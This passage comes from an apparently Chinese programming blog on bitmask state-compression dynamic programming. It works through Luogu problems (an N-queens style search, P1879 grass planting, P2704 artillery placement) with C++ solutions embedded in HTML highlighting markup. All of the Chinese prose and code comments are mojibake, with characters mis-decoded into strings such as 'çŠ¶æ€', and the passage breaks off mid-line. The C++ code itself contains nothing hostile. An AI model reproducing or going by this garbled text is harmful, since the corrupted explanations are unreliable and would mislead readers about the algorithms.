class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> log_2[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> cnt_success=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> limit_state;</span><br><span class="line"><span class="type">int</span> col[maxn];<span class="comment">//ç¬¬iè¡Œæ”¾åœ¨ç¬¬col[i]åˆ—ä¸Š</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);<span class="comment">//-xä¸ºå–è¡¥,~xä¸ºæŒ‰ä½å–å</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">        cout&lt;&lt;col[i]<span class="number">+1</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> column_state,<span class="type">int</span> diagonal_state,<span class="type">int</span> rdiagonal_state,<span class="type">int</span> row)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row&gt;n)&#123;</span><br><span class="line">        ++cnt_success;</span><br><span class="line">        <span class="keyword">if</span>(cnt_success&lt;=<span class="number">3</span>)&#123;<span class="comment">//æ‰“å°å‰ä¸‰ä¸ªæ’åˆ—</span></span><br><span class="line">            <span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> capture_state=(column_state|diagonal_state|rdiagonal_state)&amp;limit_state;</span><br><span class="line">    <span class="type">int</span> available_state=(~capture_state)&amp;limit_state;<span class="comment">//~æŒ‰ä½å–å,</span></span><br><span class="line">    <span class="type">int</span> position_state;</span><br><span class="line">    <span class="type">int</span> position;</span><br><span class="line">    <span class="keyword">while</span>(available_state)&#123;</span><br><span class="line">        position_state=<span class="built_in">lowbit</span>(available_state);<span class="comment">//lowbitæ¯æ¬¡å…ˆå°è¯•æœ€ä½ä½,ä¿è¯äº†å¾—åˆ°ç»“æœçš„é¡ºåºæ˜¯æŒ‰ç…§å­—å…¸åºçš„</span></span><br><span class="line">        position=log_2[position_state];</span><br><span class="line">        col[row]=position;</span><br><span class="line">        <span class="built_in">dfs</span>(column_state|position_state,(diagonal_state|position_state)&gt;&gt;<span class="number">1</span>,(rdiagonal_state|position_state)&lt;&lt;<span class="number">1</span>,row<span class="number">+1</span>);</span><br><span class="line">        available_state-=position_state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//è§„å®šyi&#x27;man</span></span><br><span class="line">    log_2[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;<span class="number">10000</span>;i++)&#123;<span class="comment">//åˆå§‹åŒ–log_2å¯¹æ•°å‡½æ•°</span></span><br><span class="line">        log_2[i]=log_2[i/<span class="number">2</span>]<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_success&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1879-å…«å°†å†›"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1879">P1879 å…«å°†å†›</a></h2>
<p><span class="math inline">\(M\times N\)</span>ä¸ªæ ¼å­çš„çŸ©å½¢åœ°é¢</p>
<p>ç„¶åè¾“å…¥<span class="math inline">\(M\times
N\)</span>ä¸ªæ•°è¡¨æ˜è¿™ä¸ªåœ°é¢æ˜¯å¦è‚¥æ²ƒ,1è‚¥æ²ƒ,0è´«ç˜ </p>
<p>å…¶ä¸­<span class="math inline">\(1\leq M,N\leq 12\)</span></p>
<p>è‚¥æ²ƒçš„åœŸåœ°å¯ä»¥ç§è‰,è´«ç˜ çš„ä¸è¡Œ</p>
<p>ä»»ä½•ä¸¤ä¸ªè‰åœ°ä¸èƒ½æœ‰ç›¸é‚»è¾¹,å¯ä»¥æœ‰ç›¸é‚»é¡¶è§’</p>
<p>æ±‚æœ‰å¤šå°‘ç§å®‰æ’æ–¹æ³•</p>
<p>é—®é¢˜å¯ä»¥å‘å…«ç‹å…«é æ‹¢,å¦‚æœç§è‰åœ°å¯ä»¥è§†ä¸ºå äº†ä¸€ä¸ªä¸­å›½è±¡æ£‹çš„å°†å†›,å‰åå·¦å³å››ä¸ªæ ¼å­å†…ä¸å…è®¸æœ‰ç¬¬äºŒä¸ªå°†å†›.è´«ç˜ çš„æ ¼å­ä¸å…è®¸æ”¾æ£‹</p>
<p>å¦‚æœå…«ç‹å…«é—®é¢˜ä¸­ä¹Ÿæœ‰ä¸€äº›æ£‹ç›˜ä¸å…è®¸æ”¾ç½®æ£‹å­åˆ™å’Œæœ¬é¢˜å°±å¾ˆç›¸ä¼¼äº†</p>
<h3 id="çŠ¶æ€å‹ç¼©-2">çŠ¶æ€å‹ç¼©</h3>
<p>ä¸€è¡Œæœ€å¤šæœ‰12ä¸ªæ ¼å­,æ¯ä¸ªæ ¼å­è¦ä¹ˆç§è‰,è¦ä¹ˆä¸ä¸­,ä¸€ä¸ªäºŒè¿›åˆ¶ä½ä¸¤ç§çŠ¶æ€è¡¨ç¤ºä¸€ä¸ªæ ¼å­å³å¯,é‚£ä¹ˆä¸€è¡Œåªéœ€è¦12ä¸ªäºŒè¿›åˆ¶ä½,æ˜¾ç„¶ä¸€ä¸ªintæœ‰32ä½è¶³å¤Ÿè¡¨ç¤ºä¸€è¡Œçš„çŠ¶æ€</p>
<p>è´«ç˜ çš„æ ¼å­å¦‚ä½•å»ºæ¨¡?è´«ç˜ çš„æ ¼å­ä¸å…è®¸ç§è‰å°±è¡Œäº†å‘—</p>
<h3 id="çŠ¶æ€è½¬ç§»-2">çŠ¶æ€è½¬ç§»</h3>
<p>ç±»æ¯”å…«å›½ç‹é—®é¢˜,è®¾è®¡dpçŠ¶æ€ <span class="math display">\[
dp[current\_row][current\_state]
\]</span> è¡¨ç¤º:</p>
<p>å·²ç»å®‰æ’äº†[1,current_row]è¡Œ,</p>
<p>å…¶ä¸­ç¬¬current_rowè¡Œçš„çŠ¶æ€æ˜¯current_stata,</p>
<p>æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶çš„ä¸åŒå®‰æ’æ•°ç›®æ˜¯<code>dp[current_row][current_state]</code></p>
<p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ˜¯ <span class="math display">\[
dp[current\_row][current\_state]=\\
\sum_{previous\_state}dp[previous\_row][previous\_state]
\]</span>
è¿™é‡Œè¦æ±‚<code>previous_state</code>å’Œ<code>current_state</code>ä¸¤ä¸ªçŠ¶æ€ä¸èƒ½ç›¸äº’å†²çª,ä¹Ÿå°±æ˜¯ä¸Šä¸€è¡Œçš„ç§è‰æ ¼å­,ä¸‹ä¸€è¡Œè¿™ä¸ªæ ¼å­ä¸å…è®¸ç§è‰</p>
<h3 id="å®Œæ•´ä»£ç -1">å®Œæ•´ä»£ç </h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//è¾“å…¥ä¸€è¡ŒåœŸåœ°è´«ç˜ çŠ¶æ€ä¹‹åå‹ç¼©æˆä¸€ä¸ªæ•´æ•°,row_base_state[i]è¡¨ç¤ºç¬¬iè¡Œçš„åœ°çš®æ˜¯è´«ç˜ è¿˜æ˜¯è‚¥æ²ƒ</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_state[maxn];<span class="comment">//ro_legal_state[i]è¡¨ç¤ºç¬¬iè¡Œçš„æ‰€æœ‰åˆæ³•çŠ¶æ€é›†åˆ(åŒè¡Œå†…æ²¡æœ‰ç›¸é‚»è‰åœ°å¹¶ä¸”è€ƒè™‘è´«ç˜ åœŸåœ°)</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//è¡ŒçŠ¶æ€ä¸Šé™</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1000000</span>];<span class="comment">//dp[current_row][current_state],ç¬¬1åˆ°current_rowè¡Œéƒ½å·²ç»å®‰æ’,å…¶ä¸­ç¬¬current_rowè¡Œçš„çŠ¶æ€æ˜¯current_state</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;<span class="comment">//mè¡Œ,æ¯è¡Œæœ‰nåˆ—</span></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//è¡ŒçŠ¶æ€ä¸Šé™</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//ç”¨äºæ‰¿è½½ä¸€ä¸ªæ ¼å­çš„çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;<span class="comment">//è·å–è¾“å…¥å‹ç¼©åˆ°row_base_state</span></span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;<span class="comment">//ç”¨äºå‹ç¼©ä¸€è¡Œçš„çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            cin&gt;&gt;single_state;</span><br><span class="line">            <span class="comment">//æœ€å…ˆè¾“å…¥çš„æ ¼å­æƒä½æœ€é«˜,ä¹Ÿå°±æ˜¯è¯´æœ€å·¦ä¾§çš„æ ¼å­åœ¨çŠ¶æ€çš„æœ€é«˜äºŒè¿›åˆ¶ä½</span></span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;<span class="comment">//è¡ŒçŠ¶æ€=åˆšæ‰çš„è¡ŒçŠ¶æ€å·¦ç§»ä¸€ä½åŠ ä¸Šæ–°æ ¼å­çš„çŠ¶æ€</span></span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[i]=row_state;<span class="comment">//è®¡ç®—å¾—å‡ºäº†ç¬¬iè¡Œçš„å‹ç¼©çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//è®¡ç®—ç¬¬iè¡Œçš„æ‰€æœ‰åˆæ³•ç§è‰çŠ¶æ€,ç¬¬iè¡Œçš„æ¯ç§åˆæ³•ç§è‰çŠ¶æ€éƒ½æ”¾åˆ°row_legal_state[i]ä¸­</span></span><br><span class="line">            <span class="keyword">if</span>((row_state&amp;((row_state&lt;&lt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span> &amp;&amp; ((row_state&amp;((~row_base_state[i])&amp;row_limit_state))==<span class="number">0</span>))&#123;</span><br><span class="line">                row_legal_state[i].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//è®¾ç½®dpåˆå§‹æ¡ä»¶,å•¥ä¹Ÿä¸ç§çš„çŠ¶æ€åªæœ‰ä¸€ç§</span></span><br><span class="line">    row_legal_state[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//ç¬¬0è¡Œæ²¡æœ‰ä»»ä½•åˆæ³•çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">1</span>;current_row&lt;=m;++current_row)&#123;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_row_state:row_legal_state[current_row])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_row_state:row_legal_state[previous_row])&#123;</span><br><span class="line">                <span class="keyword">if</span>((current_row_state&amp;previous_row_state)==<span class="number">0</span>)&#123;<span class="comment">//ä¸¤è¡Œä¸èƒ½å†²çª</span></span><br><span class="line">                    dp[current_row][current_row_state]+=dp[previous_row][previous_row_state];<span class="comment">//çŠ¶æ€è½¬ç§»</span></span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=row_limit_state;i++)&#123;</span><br><span class="line">        result=(result+dp[m][i])%mod;<span class="comment">//ç¬¬mè¡Œçš„æ‰€æœ‰çŠ¶æ€éƒ½è¦è€ƒè™‘åœ¨å†…</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p2704-å…«ç‚®å…µ"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2704">P2704 å…«ç‚®å…µ</a></h2>
<p>ç»™ä¸€ä¸ªPå’ŒHè¡¨ç¤ºçš„åœ°å½¢åœ°å›¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/1881.png"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>å…¶ä¸­åªæœ‰P(Plain,å¹³åŸ)æ ¼å­å¯ä»¥æ”¾ç‚®å…µ,Hå±±åœ°ä¸è¡Œ</p>
<h3 id="çŠ¶æ€å‹ç¼©-3">çŠ¶æ€å‹ç¼©</h3>
<p>ä¸€ä¸ªç‚®å…µçš„æ‰“ç‚®èŒƒå›´æ˜¯æ¨ªç«–çš„ä¸¤æ ¼ç›¸å½“äºä¸­è±¡é‡Œå°†å†›è…¿å†é•¿ä¸€ç‚¹</p>
<p>å®é™…ä¸Šå’ŒP1879æ£’å­åœ°å¾ˆç›¸ä¼¼äº†,P1879ç§è‰çš„æ–¹æ ¼ç›¸å½“äºæ”¾äº†æœ‰ä¸€ä¸ªä¸­è±¡çš„å°†å†›,è¿™ä¸ªé¢˜çš„æ ¼å­ç›¸å½“äºæ”¾äº†ä¸€ä¸ªå£®ä¸€ç‚¹çš„å°†å†›</p>
<p>åŸæ¥ä¸€ä¸ªå°†å†›é¡¶å¤šå½±å“è·Ÿå‰çš„å››ä¸ªæ ¼å­,ç°åœ¨ä¸€ä¸ªç‚®å¯ä»¥å½±å“8ä¸ªæ ¼å­,</p>
<p>ä¸å¦¨æŠŠè·Ÿå‰è¿™å››ä¸ªæ ¼å­å«åš"ä¸€çº§å½±å“",ç¨å¾®è¿œä¸€ç‚¹çš„å››ä¸ªæ ¼å­å«åš"äºŒçº§å½±å“",å¦‚ä¸‹å›¾ç¤ºæ„</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222194252888.png"
alt="image-20221222194252888" />
<figcaption aria-hidden="true">image-20221222194252888</figcaption>
</figure>
<p><strong>å¯è§ä¸€ä¸ªå°†å†›å’Œä¸€ä¸ªç‚®çš„åŒºåˆ«å°±æ˜¯,å°†å†›åªæœ‰ä¸€çº§å½±å“,ç‚®è¿˜æœ‰äºŒçº§å½±å“</strong></p>
<p>P1879è¿™ä¸ªé¢˜ä¸­è¦å®‰æ’ä¸€è¡Œæ—¶,åªéœ€è¦è€ƒè™‘ä¸Šä¸€è¡Œç»™è¿™ä¸€è¡Œé€ æˆçš„ä¸€çº§å½±å“.</p>
<p>æœ¬é¢˜ä¸­é™¤äº†ä¸€çº§å½±å“,è¿˜è¦è€ƒè™‘äºŒçº§å½±å“,å› æ­¤æœ¬é¢˜å¯ä»¥çœ‹ä½œP1879çš„æ¨å¹¿,</p>
<h3 id="çŠ¶æ€è½¬ç§»-3">çŠ¶æ€è½¬ç§»</h3>
<p>åŸæ¥çš„çŠ¶æ€<code>dp[current_row][current_state]</code>è¡¨ç¤º1åˆ°<code>current_row</code>è¡Œå·²ç»å®‰æ’å®Œæ¯•,å…¶ä¸­<code>current_state</code>æ˜¯ç¬¬<code>current_row</code>è¡Œçš„çŠ¶æ€,ä¹Ÿå°±æ˜¯å¯¹<code>current_row+1</code>è¡Œçš„"ä¸€çº§å½±å“"</p>
<p>å› æ­¤æ‹“å±•åˆ°æœ‰äºŒçº§å½±å“çš„æƒ…å†µ,åº”è¯¥è¿™æ ·è®¾ç½®çŠ¶æ€<code>dp[current_row][current_state][previous_state]</code>,æ„æ€æ˜¯</p>
<p>å½“å‰å·²ç»å®‰æ’å¥½äº†1åˆ°<code>current_row</code>è¡Œ,</p>
<p>ç¬¬<code>current_row</code>è¡Œçš„çŠ¶æ€æ˜¯<code>current_state</code>,</p>
<p>ç¬¬<code>previous_row=current_row-1</code>è¡Œçš„çŠ¶æ€æ˜¯<code>previous_state</code></p>
<p><code>dp[current_row][current_state][previous_state]</code>ç­‰äºåœ¨å‰è¿°ä¸‰ä¸ªæ¡ä»¶ä¸‹å¾—åˆ°çš„æœ€å¤§ç‚®å…µæ•°é‡
<span class="math display">\[
å½“å‰çŠ¶æ€çš„æœ€å¤§ç‚®å…µæ•°=max(æšä¸¾ä¸å½“å‰è¡Œä¸å†²çªçš„ä¸Šä¸€è¡ŒçŠ¶æ€çš„æœ€å¤§ç‚®å…µæ•°+å½“å‰è¡ŒçŠ¶æ€è´¡çŒ®çš„ç‚®å…µæ•°)
\]</span></p>
<p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±æ˜¯:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(</span><br><span class="line">	dp[previous_row][previous_state][preprevious_state]+cnt_of_cannons_in_state[current_state];</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="å®Œæ•´ä»£ç -2">å®Œæ•´ä»£ç </h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;<span class="comment">//æœ€å¤§è¡Œæ•°</span></span><br><span class="line"><span class="type">int</span> n,m;<span class="comment">//nè¡Œ,måˆ—</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//ä¸€è¡Œçš„æœ€å¤§çŠ¶æ€</span></span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//ä¸€è¡Œä¸­çš„åœ°å½¢çŠ¶æ€,row_base_state[i]ä¸ºç¬¬iè¡Œçš„åœ°å½¢çŠ¶æ€</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_states[maxn];<span class="comment">//åªçœ‹ä¸€è¡Œæ—¶,è¯¥è¡Œçš„æ‰€æœ‰åˆæ³•æ‘†æ”¾ç‚®å…µçš„çŠ¶æ€é›†åˆ,row_legal_states[i]ä¸ºç¬¬iè¡Œæ‰€æœ‰å¯ä»¥æ‘†æ”¾çš„çŠ¶æ€</span></span><br><span class="line"><span class="type">int</span> cnt_max_cannons;<span class="comment">//è®°å½•æœ€å¤§ç‚®å…µæ•°é‡</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1025</span>][<span class="number">1025</span>];</span><br><span class="line"><span class="type">int</span> cnt_cannons_in_state[<span class="number">1025</span>];<span class="comment">//cnt_cannons_in_state[state]è¡¨ç¤ºå½“ä¸€è¡Œçš„ç‚®å…µçŠ¶æ€ä¸ºstateæ—¶,æ”¾äº†å‡ ä¸ªç‚®å…µ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;<span class="comment">//nè¡Œmåˆ—</span></span><br><span class="line">    <span class="comment">// if(n)</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//è¾“å…¥charç±»å‹çš„åœ°å½¢è½¬æ¢æˆ0æˆ–è€…1è¡¨ç¤ºçš„åœ°å½¢</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> terrain;<span class="comment">//å­˜æ”¾åœ°å½¢è¾“å…¥</span></span><br><span class="line"></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;m)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//é¢„å¤„ç†cnt_cannons_in_stateæ•°ç»„</span></span><br><span class="line">        <span class="type">int</span> row_temp_state=row_state;</span><br><span class="line">        <span class="type">int</span> cnt_cannons=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(row_temp_state)&#123;</span><br><span class="line">            cnt_cannons+=row_temp_state&amp;<span class="number">1</span>;<span class="comment">//ä¸åœå³ç§»ç›´åˆ°é™ä¸º0,åªå…³å¿ƒæœ€ä½ä¸ºæœ‰æ²¡æœ‰1</span></span><br><span class="line">            row_temp_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_cannons_in_state[row_state]=cnt_cannons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> row=<span class="number">1</span>;row&lt;=n;row++)&#123;</span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">1</span>;col&lt;=m;++col)&#123;</span><br><span class="line">            cin&gt;&gt;terrain;</span><br><span class="line">            <span class="keyword">if</span>(terrain==<span class="string">&#x27;P&#x27;</span>)&#123;</span><br><span class="line">                single_state=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                single_state=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;</span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[row]=row_state;<span class="comment">//ä¿å­˜åœ°å½¢çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç«‹åˆ»è®¡ç®—åŸºäºå½“å‰è¡Œçš„åœ°å½¢çŠ¶æ€,å¯ä»¥å¾—å‡ºçš„æ‰€æœ‰åˆæ³•çš„ç‚®å…µæ‘†æ”¾çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;row_state++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                (row_state&amp;(((row_state&lt;&lt;<span class="number">1</span>)|(row_state&lt;&lt;<span class="number">2</span>)|(row_state&gt;&gt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">2</span>) )&amp;row_limit_state)   )==<span class="number">0</span><span class="comment">//è¿™ä¸ªç‚®å…µçš„æ‘†æ”¾çŠ¶æ€ä¸èƒ½è‡ªç›¸å†²çª</span></span><br><span class="line">                &amp;&amp;</span><br><span class="line">                (row_state&amp;((~row_base_state[row])&amp;row_limit_state))==<span 